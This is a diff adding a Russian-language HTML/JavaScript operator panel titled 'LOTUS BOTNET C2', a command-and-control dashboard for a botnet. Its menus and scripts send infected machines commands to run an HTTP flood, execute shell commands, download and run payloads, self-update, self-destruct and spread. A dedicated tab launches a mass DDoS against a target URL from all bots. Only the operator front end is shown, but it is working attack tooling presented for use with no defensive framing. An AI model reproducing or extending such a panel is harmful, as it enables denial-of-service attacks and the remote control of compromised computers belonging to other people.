@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOTUS BOTNET C2</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0A0A0F; color: #A0A0B0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1A1A2E; padding-bottom: 15px; margin-bottom: 25px; flex-wrap: wrap; gap: 10px; }
+        .header h1 { color: #fff; font-size: 28px; font-weight: 700; }
+        .header h1 span { color: #2A7FFF; }
+        .header .status { font-size: 13px; background: rgba(46, 204, 113, 0.15); color: #2ecc71; padding: 6px 16px; border-radius: 20px; border: 1px solid rgba(46, 204, 113, 0.3); }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
+        .stat { background: #14141E; border: 1px solid #1A1A2E; border-radius: 12px; padding: 18px 20px; text-align: center; transition: 0.3s; }
+        .stat:hover { border-color: #2A7FFF; transform: translateY(-2px); }
+        .stat .num { font-size: 32px; font-weight: 700; color: #2A7FFF; }
+        .stat .num.online { color: #2ecc71; }
+        .stat .num.offline { color: #e74c3c; }
+        .stat .label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #666; margin-top: 4px; }
+        .tabs { display: flex; gap: 4px; border-bottom: 1px solid #1A1A2E; margin-bottom: 20px; flex-wrap: wrap; }
+        .tab { padding: 10px 22px; cursor: pointer; border: none; background: transparent; color: #666; font-size: 14px; font-weight: 600; border-radius: 8px 8px 0 0; transition: 0.3s; }
+        .tab:hover { color: #fff; background: #14141E; }
+        .tab.active { color: #2A7FFF; background: #14141E; border-bottom: 2px solid #2A7FFF; }
+        .panel { display: none; background: #14141E; border: 1px solid #1A1A2E; border-radius: 12px; padding: 20px; }
+        .panel.active { display: block; }
+        .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
+        .panel-header h3 { color: #fff; font-size: 18px; }
+        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn { padding: 7px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.3s; background: #1A1A2E; color: #A0A0B0; }
+        .btn:hover { background: #2A2A4E; color: #fff; transform: scale(1.02); }
+        .btn.primary { background: #2A7FFF; color: #fff; }
+        .btn.primary:hover { background: #3A8FFF; }
+        .btn.danger { background: #8B1A1A; color: #fff; }
+        .btn.danger:hover { background: #c0392b; }
+        .btn.success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.3); }
+        .btn.success:hover { background: rgba(46, 204, 113, 0.3); }
+        .cmd-form { display: flex; gap: 10px; flex-wrap: wrap; background: #0A0A0F; padding: 15px; border-radius: 10px; border: 1px solid #1A1A2E; margin-bottom: 20px; }
+        .cmd-form select, .cmd-form input { background: #0A0A0F; border: 1px solid #1A1A2E; color: #A0A0B0; padding: 10px 14px; border-radius: 6px; font-size: 13px; flex: 1; min-width: 120px; }
+        .cmd-form select:focus, .cmd-form input:focus { outline: none; border-color: #2A7FFF; }
+        .cmd-form button { background: #2A7FFF; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.3s; }
+        .cmd-form button:hover { background: #3A8FFF; }
+        .cmd-form button.danger { background: #c0392b; }
+        .cmd-form button.danger:hover { background: #e74c3c; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { text-align: left; padding: 10px 12px; border-bottom: 2px solid #1A1A2E; color: #888; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; }
+        td { padding: 10px 12px; border-bottom: 1px solid #0A0A0F; vertical-align: middle; }
+        .status-badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 10px; font-weight: 700; }
+        .status-badge.online { background: rgba(46, 204, 113, 0.15); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.3); }
+        .status-badge.offline { background: rgba(231, 76, 60, 0.15); color: #e74c3c; border: 1px solid rgba(231, 76, 60, 0.3); }
+        .id-cell { font-family: 'Courier New', monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .logs-container { max-height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; }
+        .log-item { padding: 4px 0; border-bottom: 1px solid #0A0A0F; display: flex; gap: 10px; }
+        .log-item .time { color: #555; min-width: 70px; }
+        .log-item .bot { color: #2A7FFF; min-width: 100px; }
+        .log-item .msg { color: #A0A0B0; word-break: break-all; }
+        .ddos-panel { background: #0A0A0F; padding: 15px; border-radius: 10px; border: 1px solid #1A1A2E; margin-top: 15px; }
+        .ddos-panel p { color: #666; font-size: 13px; margin: 4px 0; }
+        .ddos-panel .highlight { color: #2A7FFF; font-weight: 700; }
+        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } .cmd-form { flex-direction: column; } .header { flex-direction: column; align-items: flex-start; } }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #1A1A2E; border-radius: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        .empty-state { color: #555; text-align: center; padding: 30px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>🐍 LOTUS <span>BOTNET</span> C2</h1>
+        <div class="status">🟢 ONLINE • <span id="botCount">0</span> ботов</div>
+    </div>
+
+    <div class="stats">
+        <div class="stat"><div class="num" id="total">0</div><div class="label">Всего ботов</div></div>
+        <div class="stat"><div class="num online" id="online">0</div><div class="label">Онлайн</div></div>
+        <div class="stat"><div class="num offline" id="offline">0</div><div class="label">Оффлайн</div></div>
+        <div class="stat"><div class="num" id="commands">0</div><div class="label">Команд в очереди</div></div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab active" onclick="switchTab('bots')">🤖 Боты</button>
+        <button class="tab" onclick="switchTab('commands')">📡 Команды</button>
+        <button class="tab" onclick="switchTab('logs')">📋 Логи</button>
+        <button class="tab" onclick="switchTab('ddos')">💥 DDoS</button>
+    </div>
+
+    <div class="panel active" id="panel-bots">
+        <div class="panel-header">
+            <h3>🤖 Активные боты</h3>
+            <div class="btn-group">
+                <button class="btn primary" onclick="refreshBots()">🔄 Обновить</button>
+                <button class="btn danger" onclick="deleteAllBots()">🗑️ Удалить всех</button>
+            </div>
+        </div>
+        <div style="overflow-x:auto;">
+            <table>
+                <thead><tr><th>ID</th><th>IP</th><th>Статус</th><th>Последний раз</th><th>Действия</th></tr></thead>
+                <tbody id="botsBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="panel" id="panel-commands">
+        <div class="panel-header"><h3>📡 Отправить команду</h3></div>
+        <form class="cmd-form" onsubmit="sendCommand(event)">
+            <select id="cmdBotSelect">
+                <option value="all">🌐 ВСЕМ БОТАМ</option>
+            </select>
+            <select id="cmdType">
+                <option value="http_flood">💥 HTTP Flood</option>
+                <option value="cmd">💻 CMD</option>
+                <option value="download">📥 Скачать и запустить</option>
+                <option value="update">🔄 Обновиться</option>
+                <option value="selfdestruct">💀 Самоуничтожение</option>
+                <option value="spread">📀 Распространиться</option>
+                <option value="info">📊 Информация</option>
+            </select>
+            <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
+            <button type="submit">▶ Отправить</button>
+        </form>
+
+        <div class="panel-header" style="margin-top:20px;"><h3>📋 История команд</h3></div>
+        <div style="overflow-x:auto;">
+            <table>
+                <thead><tr><th>Бот</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead>
+                <tbody id="commandsBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="panel" id="panel-logs">
+        <div class="panel-header">
+            <h3>📋 Логи</h3>
+            <div class="btn-group">
+                <button class="btn primary" onclick="refreshLogs()">🔄 Обновить</button>
+                <button class="btn danger" onclick="clearLogs()">🗑️ Очистить</button>
+            </div>
+        </div>
+        <div class="logs-container" id="logsContainer">
+            <div class="empty-state">Загрузка логов...</div>
+        </div>
+    </div>
+
+    <div class="panel" id="panel-ddos">
+        <div class="panel-header"><h3>💥 МАССОВАЯ HTTP FLOOD</h3></div>
+        <form class="cmd-form" onsubmit="startDDoS(event)">
+            <input type="text" id="ddosTarget" placeholder="https://target.com" style="flex:2; min-width:300px;">
+            <button type="submit" class="danger">🔥 ЗАПУСТИТЬ HTTP FLOOD</button>
+        </form>
+        <div class="ddos-panel">
+            <p>💡 Атака начнется через 5-15 секунд на всех подключенных ботах</p>
+            <p>📊 Ботов в атаке: <span class="highlight" id="ddosCount">0</span></p>
+            <p>⚡ Метод: HTTP/1.1 Flood с ротацией User-Agent и заголовков</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    function switchTab(name) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        document.getElementById('panel-' + name).classList.add('active');
+        document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
+        if (name === 'bots') refreshBots();
+        if (name === 'logs') refreshLogs();
+    }
+
+    async function refreshStats() {
+        try {
+            const r = await fetch('/api/stats');
+            const data = await r.json();
+            document.getElementById('total').textContent = data.total || 0;
+            document.getElementById('online').textContent = data.online || 0;
+            document.getElementById('offline').textContent = data.offline || 0;
+            document.getElementById('commands').textContent = data.commands || 0;
+            document.getElementById('botCount').textContent = data.online || 0;
+            document.getElementById('ddosCount').textContent = data.online || 0;
+        } catch {}
+    }
+
+    async function refreshBots() {
+        try {
+            const r = await fetch('/api/bots');
+            const data = await r.json();
+            const tbody = document.getElementById('botsBody');
+            const select = document.getElementById('cmdBotSelect');
+            select.innerHTML = '<option value="all">🌐 ВСЕМ БОТАМ</option>';
+
+            if (!data || data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="empty-state">Нет ботов</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = '';
+            data.forEach(bot => {
+                const statusClass = bot.status === 'online' ? 'online' : 'offline';
+                const lastSeen = bot.last_seen ? new Date(bot.last_seen * 1000).toLocaleString() : 'Никогда';
+                const ip = bot.ip || 'N/A';
+
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td class="id-cell" title="${bot.id}">${bot.id}</td>
+                    <td>${ip}</td>
+                    <td><span class="status-badge ${statusClass}">${bot.status}</span></td>
+                    <td>${lastSeen}</td>
+                    <td>
+                        <button class="btn" onclick="sendQuick('${bot.id}','info','')">📊</button>
+                        <button class="btn danger" onclick="deleteBot('${bot.id}')">🗑️</button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+
+                const opt = document.createElement('option');
+                opt.value = bot.id;
+                opt.textContent = bot.id + ' (' + ip + ')';
+                select.appendChild(opt);
+            });
+            refreshStats();
+        } catch (e) {}
+    }
+
+    async function refreshLogs() {
+        try {
+            const r = await fetch('/api/logs?limit=100');
+            const data = await r.json();
+            const container = document.getElementById('logsContainer');
+            if (!data || data.length === 0) {
+                container.innerHTML = '<div class="empty-state">Логов нет</div>';
+                return;
+            }
+            container.innerHTML = '';
+            data.forEach(log => {
+                const div = document.createElement('div');
+                div.className = 'log-item';
+                const time = new Date(log.timestamp * 1000).toLocaleTimeString();
+                div.innerHTML = `
+                    <span class="time">[${time}]</span>
+                    <span class="bot">${log.bot_id}</span>
+                    <span class="msg">${log.message || '—'}</span>
+                `;
+                container.appendChild(div);
+            });
+        } catch {}
+    }
+
+    async function sendCommand(e) {
+        e.preventDefault();
+        const botId = document.getElementById('cmdBotSelect').value;
+        const command = document.getElementById('cmdType').value;
+        const params = document.getElementById('cmdParams').value;
+
+        const fd = new FormData();
+        fd.append('bot_id', botId);
+        fd.append('command', command);
+        fd.append('params', params);
+
+        await fetch('/api/send_command', { method: 'POST', body: fd });
+        document.getElementById('cmdParams').value = '';
+        refreshStats();
+    }
+
+    async function sendQuick(botId, command, params) {
+        const fd = new FormData();
+        fd.append('bot_id', botId);
+        fd.append('command', command);
+        fd.append('params', params);
+        await fetch('/api/send_command', { method: 'POST', body: fd });
+        refreshStats();
+    }
+
+    async function startDDoS(e) {
+        e.preventDefault();
+        const target = document.getElementById('ddosTarget').value;
+        if (!target) return alert('Введите цель');
+
+        const fd = new FormData();
+        fd.append('bot_id', 'all');
+        fd.append('command', 'http_flood');
+        fd.append('params', target);
+
+        await fetch('/api/send_command', { method: 'POST', body: fd });
+        document.getElementById('ddosTarget').value = '';
+        refreshStats();
+        alert('🔥 HTTP Flood атака запущена на ' + target);
+    }
+
+    async function deleteBot(id) {
+        if (!confirm('Удалить бота ' + id + '?')) return;
+        const fd = new FormData();
+        fd.append('id', id);
+        await fetch('/api/delete_bot', { method: 'POST', body: fd });
+        refreshBots();
+    }
+
+    async function deleteAllBots() {
+        if (!confirm('Удалить ВСЕХ ботов?')) return;
+        const data = await (await fetch('/api/bots')).json();
+        for (const bot of data) {
+            const fd = new FormData();
+            fd.append('id', bot.id);
+            await fetch('/api/delete_bot', { method: 'POST', body: fd });
+        }
+        refreshBots();
+    }
+
+    async function clearLogs() {
+        if (!confirm('Очистить логи?')) return;
+        await fetch('/api/clear_logs', { method: 'POST' });
+        refreshLogs();
+    }
+
+    setInterval(refreshStats, 10000);
+    setInterval(refreshBots, 30000);
+
+    refreshStats();
+    refreshBots();
+    refreshLogs();
+</script>
+
+</body>
+</html>
